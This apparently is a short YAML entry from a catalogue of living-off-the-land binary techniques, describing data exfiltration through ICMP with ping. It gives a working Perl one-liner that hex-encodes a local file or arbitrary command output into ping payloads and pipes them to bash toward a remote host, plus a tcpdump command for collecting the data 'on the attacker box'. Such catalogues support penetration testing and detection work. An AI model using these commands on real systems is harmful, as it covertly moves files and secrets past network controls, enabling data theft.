---
functions:
  data-exfiltration:
    - description: |
        Capture ICMP packets embedded in ping requests.
        Run `sudo timeout 10 tcpdump -i any -l -n -XX 'icmp' 2>/dev/null | grep '0x0060:'` on the attacker box to collect the data.             
        ⚠️ Increase the timeout flag based on the amount of data.                             
        ⚠️ Manual parsing or reconstruction is required.  

        Send local file content over ICMP using hex-encoded payloads.
      code: |
        perl -0777 -ne '$_=unpack("H*",$_); for($i=0;$i<length;
        $i+=16){print "ping -c1 -p ",substr($_,$i,16)," $RHOST\n"}' $LFILE | bash
    - description: Send command output over ICMP using hex-encoded payloads.
      code: |
        $CMD | perl -0777 -ne '$_=unpack("H*",$_); for($i=0;$i<length;
        $i+=16){print "ping -c1 -p ",substr($_,$i,16)," $RHOST\n"}' | bash
---
